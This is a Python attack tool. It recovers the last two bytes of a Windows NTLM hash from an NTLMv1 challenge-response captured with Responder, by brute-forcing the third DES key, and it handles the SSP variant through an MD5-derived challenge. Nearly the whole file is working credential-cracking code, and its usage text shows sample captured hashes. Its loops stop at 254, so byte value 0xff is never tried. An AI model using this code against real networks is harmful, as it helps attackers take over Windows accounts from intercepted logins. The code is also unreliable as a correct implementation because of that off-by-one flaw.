from Crypto.Cipher import DES
import binascii
import hashlib
import sys

args = sys.argv[1:]

if len(args) != 1:
    print("""Use this tool to get the last two bytes of an NTLM hash from an NTLMv1 challenge reponse obtained with responder.
    The expected parameter is directly the output of responder when netntlmv1 is used.
    Example : ./thistool.py 'hashcat::DUSTIN-5AA37877:8D3A906B51ADC361BB3591FB409E10A6772122DF2A1DF4CF:FC555459FBCF81DAF3A5714B6BB70EAD6ACDD9220837431F:3ff1ec58232fa46d'
    or with SSP : ./thistool.py 'hashcat::DUSTIN-5AA37877:6DC94494429127B800000000000000000000000000000000:713D5E0956A34F7897CCCA1DDC6FC73DE4C7BB5445B8C542:1122334455667788'
    """)
    exit(1)

challresp = args[0]
elements= challresp.split(":")
if len(elements) != 6:
    print("Badly formatted ntlmv1 challenge response")
    exit(2)

def to_odd_parity(hexstr):#takes "1e2b0000000000" for example, and returns the string with added parity bits
    # the return value is a tuple containing the hex representation and the bytestring associated : ("012e4f...", "\x01\x2e\x4f...")
    if len(hexstr) != 14:#14 characters = 7 bytes = 56 bits
        raise BaseException("The provided key is not 56 bits long")

    bytestr = binascii.unhexlify(hexstr)
    binstr = ""
    for byte in bytestr:
        binstr += f"{byte:08b}"
    key = ""
    while True:
        curbits = binstr[:7]
        binstr = binstr[7:]
        if curbits.count("1") % 2 == 1:
            curbits = curbits + "0"
        else:
            curbits = curbits + "1"
        key += curbits
        if binstr == "":
            break
    key = int(key, 2)
    key = f"{key:016x}"
    return (key, binascii.unhexlify(key))

def ntlm(password):
    hasher = hashlib.new('md4')
    encoded_pass = password.encode("utf-16le")
    hasher.update(encoded_pass)
    return hasher.hexdigest()

def ntlm_to_des_keys(ntlmhash):#takes an ntlm hexstring hash and returns the three des keys ct1, ct2 and ct3
    h1 = ntlmhash[:14]
    h2 = ntlmhash[14:28]
    h3 = ntlmhash[28:]
    h3 = h3 + "00"*5
    key1 = to_odd_parity(h1)
    key2 = to_odd_parity(h2)
    key3 = to_odd_parity(h3)
    return (key1, key2, key3)

def password_to_des_keys(password):
    return ntlm_to_des_keys(ntlm(password))

def ct3_to_ntlm_last_bytes(ct3, client_challenge = "1122334455667788", lm_resp = None):#with lm_resp being the lm response when ssp is in use
    ct3 = binascii.unhexlify(ct3)
    if lm_resp:
        hasher = hashlib.md5()
        hasher.update(binascii.unhexlify(client_challenge + lm_resp[:16]))
        expected_challenge = binascii.unhexlify(hasher.hexdigest()[:16])
    else:
        expected_challenge = binascii.unhexlify(client_challenge)

    for i in range(255):
        for j in range(255):
            key = to_odd_parity(f"{i:02x}{j:02x}" + "00" * 5)
            crypter = DES.new(key[1], DES.MODE_ECB)
            candidate = crypter.decrypt(ct3)
            if candidate == expected_challenge:
                return f"{i:02x}{j:02x}"

ntresponse = elements[4]
client_chall = elements[5]
lm_resp = elements[3]
ct3 = ntresponse[-16:]
if lm_resp[16:] == "00" * 16:
    h3 = ct3_to_ntlm_last_bytes(ct3, client_chall, lm_resp[:16])
else:
    h3 = ct3_to_ntlm_last_bytes(ct3, client_chall)
print(h3)